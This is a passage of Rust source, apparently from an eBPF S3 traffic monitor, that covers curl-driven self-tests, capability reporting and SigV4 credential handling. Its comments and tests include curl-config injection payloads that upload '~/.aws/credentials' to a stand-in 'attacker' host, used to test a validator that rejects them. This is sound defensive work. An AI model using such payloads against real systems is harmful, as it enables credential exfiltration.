        proc_drops: crate::ringbuf_drops(&bpf, 2),
        sample_drops: crate::ringbuf_drops(&bpf, 3),
    };

    Ok(Captured {
        conns,
        ops,
        driver,
        loss,
        uprobes: uprobe_status(&bpf),
        truncated,
        planned_requests,
        interrupted,
    })
}

/// The pass/fail VERDICT. DNS is informational, NOT required (review M7): selftest
/// scopes capture to s3tap's OWN pid — the curl children it spawns are enrolled in-kernel
/// through the sched_process_fork tracepoint, and with `apps`/`exes` empty nothing else ever
/// can be — but under an out-of-process NSS resolver (nscd)
/// the wire DNS query is sent in the DAEMON's context — outside that scope — so DNS
/// shows no resolution on an otherwise-healthy pipeline. The capabilities that prove
/// the probes work end-to-end are TCP + TLS + HTTP; gate the exit code on those.
fn verdict_ok(caps: &Caps) -> bool {
    caps.tcp.is_some() && caps.tls.is_some() && caps.http.is_some()
}

/// Fold one record and bucket it into conns/ops.
fn collect(
    c: &mut Correlator,
    bytes: &[u8],
    undecoded: &mut u64,
    filter: &mut Option<crate::filter::Filter>,
    conns: &mut Vec<Connection>,
    ops: &mut Vec<Operation>,
) {
    match fold(c, bytes, undecoded, None, filter) {
        Some(Record::Connection(conn)) => conns.push(*conn),
        Some(Record::Operation(op)) => ops.push(*op),
        // selftest never enables sampling, so this is unreachable in practice; ignore.
        Some(Record::TcpSample(_)) => {}
        None => {}
    }
    // A close can also flush an in-flight op — collect those too.
    ops.extend(c.take_flushed_ops());
}

/// Drain at most [`crate::DRAIN_BATCH`] records from a ready ring into conns/ops. Returns
/// `true` if the ring EMPTIED (caller clears readiness), `false` if the batch cap was hit
/// with more likely queued — in which case readiness stays SET so the next `select!` pass
/// re-polls and the other arms get a turn. Same discipline (and the same cap) as `run`'s
/// [`crate::drain_batch`]: an unbounded `while let Some(..)` here starved the DEADLINE arm,
/// because capture always loads with plaintext on, so `tls_events` carries one
/// EVT_TLS_READ_BODY per SSL_read of every response body. Under `doctor --live
/// --concurrency 256` that ring refills as fast as it drains, so the timer was never polled
/// and the run overshot the `--timeout-secs` budget it advertises.
fn drain_capture_batch(
    ring: &mut RingBuf<aya::maps::MapData>,
    c: &mut Correlator,
    undecoded: &mut u64,
    filter: &mut Option<crate::filter::Filter>,
    conns: &mut Vec<Connection>,
    ops: &mut Vec<Operation>,
) -> bool {
    for _ in 0..crate::DRAIN_BATCH {
        let Some(item) = ring.next() else {
            return true; // ring drained — safe to clear readiness
        };
        collect(c, &item, undecoded, filter, conns, ops);
    }
    false // hit the batch cap; more may remain
}

/// Derive each capability's pass/detail from what was captured.
fn assess(conns: &[Connection], ops: &[Operation]) -> Caps {
    let dns = conns.iter().find_map(|c| c.dns.as_ref()).map(|d| {
        format!(
            "resolved {} ({:.1} ms, via {})",
            d.resolved_ip.as_deref().unwrap_or("?"),
            d.latency_ns as f64 / 1e6,
            d.via,
        )
    });
    // TCP works if a connect was OBSERVED and SUCCEEDED: partial=false ⇒ saw_connect,
    // and !connect_failed ⇒ it actually reached ESTABLISHED (a refused/timed-out
    // connect is observed-but-failed and must NOT pass). We don't require a measured
    // latency — a fast/loopback connect rounds to 0 ns → None — so show it when present.
    let tcp = conns
        .iter()
        .find(|c| !c.partial && !c.connect_failed)
        .map(|c| match c.tcp_connect_ns {
            Some(ns) => format!("connect {:.1} ms", ns as f64 / 1e6),
            None => "connected (latency unmeasured)".to_string(),
        });
    let tls = conns
        .iter()
        .find(|c| c.tls.seen)
        .and_then(|c| c.tls.sni.clone())
        .map(|s| format!("SNI {s}"));
    let http = ops
        .iter()
        .find(|o| o.verb.is_some() && o.http_status.is_some())
        .map(|o| {
            format!(
                "{} {} → {}",
                o.verb.as_deref().unwrap_or("?"),
                o.s3_op.as_deref().unwrap_or("?"),
                o.http_status.unwrap(),
            )
        });
    Caps { dns, tcp, tls, http }
}

/// Print the capability table to stdout. Goes through a writer (not `println!`) so a
/// broken pipe (`selftest | head`) is a catchable Err, not a panic — matching `run`.
fn report(host: &str, local: bool, caps: &Caps, uprobes: UprobeStatus) -> std::io::Result<()> {
    use std::io::Write;
    let mut out = std::io::BufWriter::new(std::io::stdout());
    out.write_all(render_report(host, local, caps, uprobes).as_bytes())?;
    out.flush()
}

/// Render the capability table as a String (the testable core of [`report`] — pinned by a
/// golden so the refactor that extracted `capture_workload` can't silently alter it).
fn render_report(host: &str, local: bool, caps: &Caps, uprobes: UprobeStatus) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    let row = |out: &mut String, name: &str, cap: &Option<String>, hint: &str| {
        let (mark, detail) = match cap {
            Some(d) => ("PASS", d.as_str()),
            None => ("FAIL", hint),
        };
        let _ = writeln!(out, "  {name:<16} {mark:<5} {detail}");
    };
    let _ = writeln!(out, "\ns3tap selftest — capability check (endpoint host: {host})\n");
    // DNS is shown but does NOT gate the verdict (review M7) — labeled so a FAIL here
    // on an otherwise-green run reads as informational, not a broken pipeline.
    row(&mut out, "DNS resolution", &caps.dns, "no resolution observed (DNS bypassed, an nscd-style out-of-process resolver, or attached late) — informational only");
    row(&mut out, "TCP connect", &caps.tcp, "no measured connect (passive/pre-attach?)");
    row(&mut out, "TLS / SNI", &caps.tls, "no ClientHello SNI (non-TLS, or no traffic captured)");
    // Name the cause we actually checked. The old hint asserted "needs the uprobe caps" for
    // every HTTP miss and pointed at a repo script an operator who installed a release
    // binary does not have. With the probes attached, no operation parsed is a fact about
    // the CLIENT (no OpenSSL symbols to hook), not about privilege.
    let http_hint = match uprobes {
        UprobeStatus::Unattached { permission: true } => {
            "no operation parsed: the TLS plaintext probes are not attached, which needs \
             cap_sys_admin. Run `sudo s3tap setup --uprobes`"
        }
        UprobeStatus::Unattached { permission: false } => {
            "no operation parsed: the TLS plaintext probes could not attach (see the warning \
             above). Without them there is no plaintext to parse"
        }
        UprobeStatus::Attached => {
            "no operation parsed although the TLS plaintext probes ARE attached, so this \
             curl does not use OpenSSL, or no request completed"
        }
    };
    row(&mut out, "HTTP semantics", &caps.http, http_hint);
    let ok = verdict_ok(caps);
    let _ = writeln!(out, "\n  result: {}", if ok { "PASS" } else { "FAIL" });
    // Explain a lone DNS miss so a green pipeline isn't mistaken for broken.
    if ok && caps.dns.is_none() {
        let _ = writeln!(
            out,
            "  note: DNS not observed but TCP/TLS/HTTP passed — under an out-of-process\n        \
             resolver (nscd) the wire query runs outside the scoped app; not a failure."
        );
    }
    // HONESTY: against a local/loopback endpoint the latencies above are
    // ~0 and meaningless as performance — selftest validates FUNCTION, not numbers.
    if local {
        let _ = writeln!(
            out,
            "  note: local endpoint — latencies are synthetic, NOT production-representative\n"
        );
    } else {
        out.push('\n');
    }
    out
}

/// selftest's driver: `requests` total, cycling GET / HEAD / GET-object so all the head
/// shapes are exercised, ONE curl process per request. Unauthenticated requests (403/404)
/// still drive the full path, which is all selftest needs. (NOT for `doctor --live` — the
/// 404 probe path would read as an http_errors finding; see [`drive_keepalive`].)
fn drive_cycling(
    endpoint: &str,
    requests: u32,
    stop: &AtomicBool,
) -> std::io::Result<DriverOutcome> {
    let mut outcome = DriverOutcome::default();
    let base = endpoint.trim_end_matches('/');
    for i in 0..requests {
        if stop.load(Ordering::Relaxed) {
            break; // the observer already proved the path — don't issue more requests
        }
        // Absolute, ownership-checked path (never a PATH lookup) — see `curl_command`.
        let mut cmd = curl_command()?;
        cmd.args(["-s", "-S", "-o", "/dev/null", "--max-time", "8"]);
        // Pass the endpoint via `--url` (never as a bare positional): curl parses
        // options anywhere, so a bare endpoint of `-K /etc/shadow` would be read as a
        // flag (file read / SSRF). `--url <v>` is unambiguously a URL. Operator-
        // supplied, so low risk, but the guard is free and correct.
        match i % 3 {
            0 => {
                cmd.args(["--url", endpoint]); // GET / — list-style
            }
            1 => {
                cmd.args(["-I", "--url", endpoint]); // HEAD
            }
            _ => {
                cmd.arg("--url").arg(format!("{base}/s3tap-selftest-probe")); // GET object
            }
        }
        // SPAWN + poll, never `status()`: `status()` blocks until curl exits, so `stop` was
        // only ever noticed BETWEEN requests and an in-flight request ran on for up to its
        // 8 s `--max-time`, so `selftest` (15 s budget) could take ~23 s and any caller
        // measuring a fixed window would have overrun its advertised cap. Kill the child
        // instead, the same discipline [`drive_keepalive`] documents as mandatory.
        let mut child = cmd.spawn()?;
        loop {
            match child.try_wait() {
                // The status is TALLIED, not judged: a 403/404 still exits 0 and is a fully
                // exercised path. A non-zero curl exit is a TRANSPORT failure (DNS, connect,
                // TLS, timeout), and a run where none of them succeeded describes that
                // failure rather than the target, which the caller has to be able to say.
                Ok(Some(st)) => {
                    outcome.record(st);
                    break;
                }
                Ok(None) => {}
                Err(e) => {
                    // Never leave a worker running on an error path (`Child` doesn't reap on drop).
                    let _ = child.kill();
                    let _ = child.wait();
                    return Err(e);
                }
            }
            if stop.load(Ordering::Relaxed) {
                let _ = child.kill();
                let _ = child.wait();
                outcome.killed += 1;
                return Ok(outcome); // the observer has its answer — abandon the in-flight request
            }
            // Tighter than drive_keepalive's 100 ms: there the poll wait is paid ONCE for a
            // whole keep-alive sequence, here it is paid per request, so a coarse slice would
            // measurably slow the drive rate.
            std::thread::sleep(Duration::from_millis(25));
        }
        // Pace the next request in slices, so a `stop` set mid-gap isn't noticed 250 ms late.
        if !nap(stop, Duration::from_millis(250)) {
            break;
        }
    }
    Ok(outcome)
}

/// Sleep `total` in short slices, returning `false` as soon as `stop` is set (`true` if the
/// full nap elapsed). A single `sleep(total)` would add its whole duration to every
/// wall-clock bound the caller advertises.
fn nap(stop: &AtomicBool, total: Duration) -> bool {
    const SLICE: Duration = Duration::from_millis(50);
    let mut left = total;
    while !left.is_zero() {
        if stop.load(Ordering::Relaxed) {
            return false;
        }
        let slice = left.min(SLICE);
        std::thread::sleep(slice);
        left -= slice;
    }
    !stop.load(Ordering::Relaxed)
}

/// `doctor --live`'s driver: issue `requests` GETs over ONE curl invocation, keeping the
/// connection alive (`curl` reuses it across repeated `--url`s to the same host) so the
/// doctor sees a real reuse signal (~(N-1)/N). Pinned to HTTP/1.1: the op parser + kernel
/// head-gate are HTTP/1-only, so an h2-negotiated endpoint (e.g. S3 behind CloudFront) would
/// parse zero ops. With one endpoint every URL is it, so a healthy target is all-2xx;
/// with `rotate`, the URLs cycle through `endpoints` one-per-request
/// (cold-fetch — each a distinct object).
///
/// One invocation can't be halted *between* its `--url`s, so we SPAWN the child (not
/// `status()`) and poll `stop`: when `capture_workload` sets it (the deadline elapsed),
/// we KILL the child — making `--timeout-secs` an actual wall-clock bound rather than
/// relying on curl's per-transfer `--max-time` (which, summed over N URLs, can run far
/// past the budget on a stuck endpoint). The design mandates this child-kill.
///
/// `concurrency` fans this out: N curl workers run the SAME `requests` sequence at once, each
/// on its own invocation → its own connection, so the doctor observes N connections in flight
/// and can judge the path under CONCURRENT load (contention-only signals: RTT inflation,
/// retransmits, the throughput/BDP ceiling). Every worker is killed on `stop`, so the
/// wall-clock bound still holds regardless of N.
fn drive_keepalive(
    endpoints: &[String],
    requests: u32,
    rotate: bool,
    concurrency: u32,
    auth: Option<&AwsCreds>,
    stop: &AtomicBool,
) -> std::io::Result<DriverOutcome> {
    let mut outcome = DriverOutcome::default();
    // The URL each request hits: rotate → cycle the objects (cold); else → the first, N times.
    let seq: Vec<&str> = (0..requests as usize)
        .map(|i| {
            let idx = if rotate && !endpoints.is_empty() { i % endpoints.len() } else { 0 };
            endpoints[idx].as_str()
        })
        .collect();
    let workers = keepalive_worker_args(&seq, concurrency);
    // Never leave workers running on ANY error path — `std::process::Child` does not kill/reap
    // on drop, so a leaked worker would escape the stop-deadline kill and blow the wall-clock
    // bound. `reap_all` is the single cleanup used on a spawn/auth-write failure, a poll error,
    // and the stop deadline. (A spawn failure part-way through is plausible at high N under
    // RLIMIT_NPROC; a live-child `try_wait` error effectively never happens, but the cleanup
    // discipline stays uniform.)
    let reap_all = |cs: &mut [std::process::Child]| {
        for c in cs.iter_mut() {
            let _ = c.kill();
            let _ = c.wait();
        }
    };
    let mut children = Vec::with_capacity(workers.len());
    for argv in &workers {
        match spawn_keepalive_worker(argv, auth) {
            Ok(child) => children.push(child),
            Err(e) => {
                reap_all(&mut children);
                return Err(e);
            }
        }
    }
    // Poll every worker; a reaped child stays `done` (try_wait would error if polled after reap).
    let mut done = vec![false; children.len()];
    loop {
        for i in 0..children.len() {
            if done[i] {
                continue;
            }
            match children[i].try_wait() {
                // Tally, don't judge: a non-2xx still exits 0 and is a real finding about
                // the target. A non-zero curl exit is a TRANSPORT failure, and a run where
                // no worker succeeded describes that rather than the target's health.
                Ok(Some(st)) => {
                    done[i] = true;
                    outcome.record(st);
                }
                Ok(None) => {}
                Err(e) => {
                    reap_all(&mut children);
                    return Err(e);
                }
            }
        }
        if done.iter().all(|&d| d) {
            break;
        }
        if stop.load(Ordering::Relaxed) {
            outcome.killed += done.iter().filter(|&&d| !d).count() as u32;
            reap_all(&mut children);
            break;
        }
        std::thread::sleep(Duration::from_millis(100));
    }
    Ok(outcome)
}

/// The keep-alive driver's curl argv (sans the `curl` program and the auth `-K -`): the
/// fixed flags followed by one `-o /dev/null --url U` per URL in the request sequence `urls`.
/// The `-o` MUST repeat per `--url`: curl pairs each `-o` with the next URL, so a single `-o`
/// discards only the first body and dumps the rest to stdout (a regression live validation
/// caught). `urls` is already the full per-request sequence (all the same object, or the
/// rotated set).
fn keepalive_curl_args(urls: &[&str]) -> Vec<String> {
    let mut args: Vec<String> =
        ["-s", "-S", "--http1.1", "--max-time", "30"].iter().map(|s| s.to_string()).collect();
    for u in urls {
        args.extend(["-o", "/dev/null", "--url", u].iter().map(|s| s.to_string()));
    }
    args
}

/// One curl argv per parallel worker: `concurrency` (clamped to >=1) copies of the keep-alive
/// argv, since every worker drives the SAME request sequence on its own connection. Pure, so
/// the fan-out is unit-testable without spawning curl.
fn keepalive_worker_args(urls: &[&str], concurrency: u32) -> Vec<Vec<String>> {
    let base = keepalive_curl_args(urls);
    vec![base; concurrency.max(1) as usize]
}

/// Spawn one keep-alive curl worker, feeding it the SigV4 `-K -` config on stdin when signed.
/// If the auth write fails after the child spawned, the child is killed + reaped before the
/// error is returned — so a failure never leaks a running worker (the caller likewise cleans
/// up the workers spawned before it).
fn spawn_keepalive_worker(
    argv: &[String],
    auth: Option<&AwsCreds>,
) -> std::io::Result<std::process::Child> {
    use std::io::Write;
    // Build (and VALIDATE) the config before spawning: a rejected credential must not leave a
    // curl process running behind the error.
    let cfg = match auth {
        // curl config: long-option names without `--`, values quoted.
        Some(c) => Some(curl_auth_config(c)?),
        None => None,
    };
    // Absolute, ownership-checked path (never a PATH lookup) — see `curl_command`. This is
    // the spawn that receives the SigV4 secret on stdin, so it is the one that must not be
    // resolvable by whoever set our environment.
    let mut cmd = curl_command()?;
    cmd.args(argv);
    if cfg.is_some() {
        cmd.args(["-K", "-"]).stdin(std::process::Stdio::piped());
    }
    let mut child = cmd.spawn()?;
    if let Some(cfg) = cfg {
        let mut stdin = child.stdin.take().expect("piped stdin");
        let w = stdin.write_all(cfg.as_bytes());
        drop(stdin); // EOF so curl proceeds
        if let Err(e) = w {
            let _ = child.kill();
            let _ = child.wait();
            return Err(e);
        }
    }
    Ok(child)
}

/// Reject a credential component that could break OUT of the quoted value we interpolate.
/// The curl `-K` config is line-oriented (`name = "value"`), so a CR/LF in a value appends
/// arbitrary curl DIRECTIVES and a `"`/`\` ends or escapes the quoted value.
///
/// This is not a theoretical input: a session token comes from an assume-role / OIDC / vault
/// helper, i.e. from a REMOTE service, so a token carrying
/// `"\nupload-file = /home/user/.aws/credentials\nurl = https://attacker/` exfiltrates the
/// operator's whole credential file with s3tap's privileges. Real AWS keys and STS tokens are
/// base64/LDH, so rejecting costs a legitimate caller nothing — and rejecting beats escaping
/// or stripping, which would silently sign with a mangled secret and fail confusingly.
pub(crate) fn reject_unsafe_cred(field: &str, value: &str) -> std::io::Result<()> {
    if let Some(c) = value.chars().find(|&c| matches!(c, '"' | '\\' | '\r' | '\n')) {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!(
                "refusing to sign: the {field} contains {c:?}, which would inject curl \
                 config directives (a credential is base64/LDH — check the source that \
                 produced it)"
            ),
        ));
    }
    Ok(())
}

/// Validate a whole credential set, so the check can run where the credential is RESOLVED
/// rather than only where it is used. Callable on its own for exactly that reason: inside
/// the driver its Err arrives at a caller that logs it as a warning and then prints a
/// confident, wrong diagnosis ("captured no records, no traffic reached the probe, check
/// `sudo s3tap setup`") for what is a credential problem. `resolve_aws_creds` (main.rs)
/// already promises that `--auth` "fails fast with a clear message, not after a capture",
/// which only holds if the charset gate runs there too.
///
/// [`curl_auth_config`] still calls it, as defence in depth: the config string must never
/// be built from an unchecked value whatever the caller did.
pub(crate) fn reject_unsafe_creds(c: &AwsCreds) -> std::io::Result<()> {
    reject_unsafe_cred("access key", &c.access_key)?;
    reject_unsafe_cred("secret key", &c.secret_key)?;
    reject_unsafe_cred("region", &c.region)?;
    if let Some(tok) = &c.session_token {
        reject_unsafe_cred("session token", tok)?;
    }
    Ok(())
}

/// Build the curl `-K` config that SigV4-signs the workload (fed via stdin, never argv).
/// curl config syntax: long-option names without `--`, values quoted. Every interpolated
/// field is charset-checked HERE ([`reject_unsafe_creds`]) rather than trusted to its
/// producer: the region is validated upstream too (resolve_aws_creds rejects
/// non-`[A-Za-z0-9-]`), but the key/secret/STS token had no such gate.
fn curl_auth_config(c: &AwsCreds) -> std::io::Result<String> {
    reject_unsafe_creds(c)?;
    let mut cfg = format!(
        "user = \"{}:{}\"\naws-sigv4 = \"aws:amz:{}:s3\"\n",
        c.access_key, c.secret_key, c.region
    );
    if let Some(tok) = &c.session_token {
        cfg.push_str(&format!("header = \"x-amz-security-token: {tok}\"\n"));
    }
    Ok(cfg)
}

/// Normalize a schemeless endpoint to https (else curl defaults to http:// → no TLS
/// → a misleading TLS/HTTP failure on an otherwise-fine host).
pub(crate) fn normalize_endpoint(endpoint: &str) -> String {
    if endpoint.contains("://") {
        endpoint.to_string()
    } else {
        format!("https://{endpoint}")
    }
}

/// Extract the host from an endpoint URL (drops scheme, path, and port).
pub(crate) fn host_of(endpoint: &str) -> String {
    let rest = endpoint
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    // A bracketed IPv6 host (`[::1]:9000`) must be taken whole — splitting on ':'
    // would otherwise yield "[" and break loopback detection.
    if let Some(stripped) = rest.strip_prefix('[') {
        if let Some(end) = stripped.find(']') {
            return stripped[..end].to_string();
        }
    }
    rest.split(['/', ':']).next().unwrap_or("").to_string()
}

/// Is this a loopback/local endpoint (so we must NOT drop-loopback in the kernel)?
pub(crate) fn is_local(host: &str) -> bool {
    // `::1` is the SINGLE IPv6 loopback address — an exact match, not a prefix (`starts_with`
    // wrongly matched `::1a2b`, `::1000`, etc.). The 127. arm is a prefix because 127.0.0.0/8
    // is a whole loopback range.
    host == "localhost" || host == "0.0.0.0" || host.starts_with("127.") || host == "::1"
}

#[cfg(test)]
mod tests {
    use super::*;

    /// This module's own source, so the two shutdown steps below can be pinned. They live
    /// inside an `async fn` that loads eBPF and spawns curl, so no unit test can CALL them.
    /// The alternative to pinning the source is pinning nothing, and what is at stake is
    /// silent: a capture that simply ends with records still in the rings looks exactly like
    /// a capture of a quieter workload. Same shape as the `setcap.sh` pins in `elevate.rs`.
    const SRC: &str = include_str!("selftest.rs");

    /// `capture_workload` must finish the way `run` does: drain both rings to empty, THEN
    /// flush the correlator's still-open operations. Without the drain, everything queued when
    /// the deadline fired is discarded, and `events` is where EVT_TCP_CLOSE (the only source of
    /// srtt/min_rtt, i.e. the RTT floor every latency verdict is a ratio against) rides.
    #[test]
    fn capture_workload_drains_both_rings_and_flushes_before_returning() {
        let tail = SRC.split("// FINAL DRAIN").nth(1).expect("the final drain is gone");
        let shutdown = tail.split("Ok(Captured {").next().expect("the Captured build");
        let tls = shutdown.find("tls_fd.get_mut()").expect("tls_events is not drained");
        let events = shutdown.find("events_fd.get_mut()").expect("events is not drained");
        // ORDER: a queued close tears down the conns/tls state `build_op` needs, so a response
        // head still sitting in tls_events must be folded FIRST.
        assert!(tls < events, "tls_events must be drained before events");
        assert!(shutdown.contains("flush_open_ops()"), "in-flight ops are never flushed");
        assert!(shutdown.contains("take_flushed_ops()"), "flushed ops are never collected");
    }

    /// The capture loop must have signal arms. A `--live --save` run reserves its destination
    /// file up front and releases it in `Drop`, so a Ctrl-C on the default disposition left an
    /// empty root-owned 0600 file that refused every later run of the same recipe. Breaking the
    /// loop instead lets the drain above run and the stack unwind through that Drop.
    #[test]
    fn capture_loop_breaks_on_a_signal_rather_than_dying_on_it() {
        let loop_body = SRC
            .split("let mut deadline = tokio::time::Instant::now() + timeout;")
            .nth(1)
            .and_then(|s| s.split("// Cancel the driver").next())
            .expect("the capture loop moved");
        assert!(loop_body.contains("sigint.recv()"), "no SIGINT arm in the capture loop");
        assert!(loop_body.contains("sigterm.recv()"), "no SIGTERM arm in the capture loop");
        // Breaking, never returning early: the drain and the Drops below the loop are the
        // whole point of catching the signal.
        assert_eq!(
            loop_body.matches("interrupted = true;").count(),
            2,
            "both signal arms must mark the capture interrupted"
        );
    }

    /// An interrupted capture is REPORTED as one. Its records are still worth judging (the
    /// operator asked to stop, not to discard), but every number in them describes a partial
    /// workload, so the caveat has to reach the operator above the verdict.
    #[test]
    fn capture_warnings_flags_an_interrupted_run() {
        let cap = Captured { interrupted: true, planned_requests: 12, ..Default::default() };
        let lines = capture_warnings(&cap);
        assert!(
            lines.iter().any(|l| l.contains("interrupted") && l.contains("of the 12 requested")),
            "{lines:?}"
        );
        // A normal run says nothing.
        assert!(capture_warnings(&Captured::default()).is_empty());
    }

    // Golden: pin the rendered capability table so the capture_workload extraction (and any
    // future change to the table format) can't silently alter selftest's output
    // (refactor-safety). A fixed all-PASS Caps, non-local endpoint.
    #[test]
    fn report_table_is_pinned() {
        let caps = Caps {
            dns: Some("resolved 52.0.0.1 (2.5 ms, via getaddrinfo)".into()),
            tcp: Some("connect 1.2 ms".into()),
            tls: Some("SNI s3.amazonaws.com".into()),
            http: Some("GET ListBuckets → 403".into()),
        };
        let expected = concat!(
            "\ns3tap selftest — capability check (endpoint host: s3.amazonaws.com)\n\n",
            "  DNS resolution   PASS  resolved 52.0.0.1 (2.5 ms, via getaddrinfo)\n",
            "  TCP connect      PASS  connect 1.2 ms\n",
            "  TLS / SNI        PASS  SNI s3.amazonaws.com\n",
            "  HTTP semantics   PASS  GET ListBuckets → 403\n",
            "\n  result: PASS\n\n",
        );
        assert_eq!(render_report("s3.amazonaws.com", false, &caps, UprobeStatus::Attached), expected);
    }

    // The FAIL path: no capability captured. Every row shows FAIL + its hint, the
    // verdict is FAIL, and (non-local) the table ends in a bare blank line — no notes.
    #[test]
    fn report_table_renders_all_fail_with_hints() {
        let caps = Caps { dns: None, tcp: None, tls: None, http: None };
        let out = render_report("s3.amazonaws.com", false, &caps, UprobeStatus::Attached);
        assert!(out.contains("DNS resolution   FAIL"), "DNS row FAIL");
        assert!(out.contains("TCP connect      FAIL  no measured connect"), "TCP hint shown");
        assert!(out.contains("HTTP semantics   FAIL"), "HTTP row FAIL");
        assert!(out.contains("result: FAIL"), "verdict FAIL when a required cap missing");
        // No DNS-note (that's only printed on an otherwise-green run) and no local note.
        assert!(!out.contains("note:"), "no notes on a plain non-local FAIL");
    }

    // A green run that nonetheless captured no DNS (an out-of-process resolver) prints
    // the explanatory DNS note so a passing pipeline isn't read as broken. Against a
    // LOCAL endpoint it also appends the synthetic-latency caveat.
    #[test]
    fn report_table_notes_a_local_run_that_passed_without_dns() {
        let caps = Caps {
            dns: None,
            tcp: Some("connect 0.1 ms".into()),
            tls: Some("SNI localhost".into()),
            http: Some("GET GetObject → 200".into()),
        };
        let out = render_report("localhost", true, &caps, UprobeStatus::Attached);
        assert!(out.contains("result: PASS"), "TCP/TLS/HTTP present ⇒ PASS despite no DNS");
        assert!(out.contains("DNS not observed but TCP/TLS/HTTP passed"), "DNS-miss note explained");
        assert!(out.contains("local endpoint — latencies are synthetic"), "local caveat shown");
    }

    #[test]
    fn keepalive_fans_out_one_argv_per_worker() {
        let urls = ["https://b.s3.amazonaws.com/o"; 3];
        // Serial (default): exactly one worker, argv == the plain keep-alive argv.
        let single = keepalive_worker_args(&urls, 1);
        assert_eq!(single.len(), 1);
        assert_eq!(single[0], keepalive_curl_args(&urls));
        // Concurrent: N workers, each the SAME sequence on its own connection.
        let many = keepalive_worker_args(&urls, 4);
        assert_eq!(many.len(), 4);
        assert!(many.iter().all(|argv| *argv == single[0]));
        // 0 clamps to one worker — the CLI already rejects 0, but the driver stays safe.
        assert_eq!(keepalive_worker_args(&urls, 0).len(), 1);
    }

    #[test]
    fn curl_auth_config_signs_and_keeps_secret_off_argv() {
        // The config goes to curl via -K - on stdin; it must carry the SigV4 directives and
        // the STS token (when present), so nothing sensitive needs to be on the command line.
        let with_token = AwsCreds {
            access_key: "AKID".into(),
            secret_key: "SECRET".into(),
            session_token: Some("STStoken".into()),
            region: "us-east-1".into(),
        };
        let cfg = curl_auth_config(&with_token).expect("plain credentials are accepted");
        assert!(cfg.contains("user = \"AKID:SECRET\""));
        assert!(cfg.contains("aws-sigv4 = \"aws:amz:us-east-1:s3\""));
        assert!(cfg.contains("header = \"x-amz-security-token: STStoken\""));
        // No token -> no header line.
        let no_token = AwsCreds { session_token: None, ..with_token };
        assert!(!curl_auth_config(&no_token).unwrap().contains("x-amz-security-token"));
    }

    #[test]
    fn curl_auth_config_rejects_config_injecting_credentials() {
        // The `-K` config is line-oriented, so a CR/LF (or a quote closing the value) in any
        // interpolated field appends arbitrary curl directives. A session token in particular
        // arrives from a remote assume-role/OIDC/vault helper, so this is reachable input:
        // the payload below would upload the operator's credential file to the attacker.
        let creds = |f: &str, v: &str| {
            let mut c = AwsCreds {
                access_key: "AKID".into(),
                secret_key: "SECRET".into(),
                session_token: None,
                region: "us-east-1".into(),
            };
            match f {
                "access" => c.access_key = v.into(),
                "secret" => c.secret_key = v.into(),
                "region" => c.region = v.into(),
                _ => c.session_token = Some(v.into()),
            }
            c
        };
        let evil = "tok\"\nupload-file = /home/user/.aws/credentials\nurl = https://attacker/";
        for (field, value) in [
            ("token", evil),
            ("token", "tok\rurl = https://attacker/"),
            ("access", "AK\nurl = https://attacker/"),
            ("secret", "SEC\"ret"),
            ("secret", "SEC\\ret"),
            ("region", "us-east-1\"\nurl = https://attacker/"),
        ] {
            let err = curl_auth_config(&creds(field, value))
                .expect_err("an injectable credential must be refused, not escaped");
            assert_eq!(err.kind(), std::io::ErrorKind::InvalidInput, "{field}: {value:?}");
            assert!(err.to_string().contains("refusing to sign"), "{field}: {value:?}");
            // The same verdict must be reachable WITHOUT driving a capture first: called at
            // resolution time this is a fail-fast credential error, while inside the driver
            // it reaches a caller that reports "no traffic reached the probe" and sends the
            // operator to re-run `s3tap setup` for a credential problem.
            let standalone = reject_unsafe_creds(&creds(field, value))
                .expect_err("the validator must be usable on its own");
            assert_eq!(standalone.kind(), std::io::ErrorKind::InvalidInput, "{field}");
            assert_eq!(standalone.to_string(), err.to_string(), "{field}: one wording, one gate");
        }
        // A realistic STS token (base64 + `/`, `+`, `=`) still signs — the gate must not
        // reject the credentials people actually have.
        let real = "IQoJb3JpZ2luX2VjE/wa+DBGAiEA0aB1c2VyLXRva2Vu==";
        assert!(curl_auth_config(&creds("token", real)).unwrap().contains(real));
    }

    // A cause the capture established for itself must reach the operator verbatim. Both of
    // these used to be re-diagnosed as a probe-load or permissions failure, which is the one
    // thing they are not: the fork tracepoint is a kernel-config problem and the correlator's
    // salt is an entropy problem, and `sudo s3tap setup` fixes neither.
    #[test]
    fn capture_error_passes_a_known_cause_through_undistorted() {
        let e = anyhow::Error::new(CaptureSetupError(NO_FORK_TRACKING.to_string()));
        let out = capture_error("selftest", e).to_string();
        assert!(out.starts_with("selftest: "), "the caller is still named");
        assert!(out.contains("sched_process_fork"), "names the tracepoint");
        assert!(out.contains("scopes the capture by pid"), "names why this run needs it");
        assert!(!out.contains("could not load its probes"), "not a probe-load failure");
        assert!(!out.contains("s3tap setup"), "must not send the operator to setcap");

        let entropy =
            anyhow::Error::new(CaptureSetupError("could not start the correlator: x".into()));
        assert_eq!(
            capture_error("doctor --live", entropy).to_string(),
            "doctor --live: could not start the correlator: x"
        );

        // An unknown error still gets the old discrimination (kernel/BTF, not capabilities).
        let other = capture_error("selftest", anyhow::anyhow!("boom"));
        assert!(other.to_string().contains("could not load its probes"));
    }

    #[test]
    fn nap_returns_early_once_stop_is_set() {
        // The inter-request pacing must not add its full duration to the caller's wall-clock
        // bound after the observer has already stopped the run.
        let stop = AtomicBool::new(true);
        let t = std::time::Instant::now();
        assert!(!nap(&stop, Duration::from_secs(30)), "an already-set stop returns immediately");
        assert!(t.elapsed() < Duration::from_secs(1), "no sleeping past a set stop");
        // A clear flag naps the whole (short) duration.
        let go = AtomicBool::new(false);
        assert!(nap(&go, Duration::from_millis(60)));
    }

    #[test]
    fn host_extraction() {
        assert_eq!(host_of("https://s3.amazonaws.com"), "s3.amazonaws.com");
        assert_eq!(host_of("https://s3.amazonaws.com/bucket/key"), "s3.amazonaws.com");
        assert_eq!(host_of("http://127.0.0.1:9000"), "127.0.0.1");
        assert_eq!(host_of("https://minio.local:443/"), "minio.local");
        // Bracketed IPv6 (so is_local can recognize ::1 loopback).
        assert_eq!(host_of("http://[::1]:9000"), "::1");
        assert_eq!(host_of("https://[2606:4700::1]/p"), "2606:4700::1");
        assert!(is_local(&host_of("http://[::1]:9000")), "[::1] is loopback");
    }

    #[test]
    fn schemeless_endpoint_gets_https() {
        assert_eq!(normalize_endpoint("s3.amazonaws.com"), "https://s3.amazonaws.com");
        assert_eq!(normalize_endpoint("https://s3.amazonaws.com"), "https://s3.amazonaws.com");
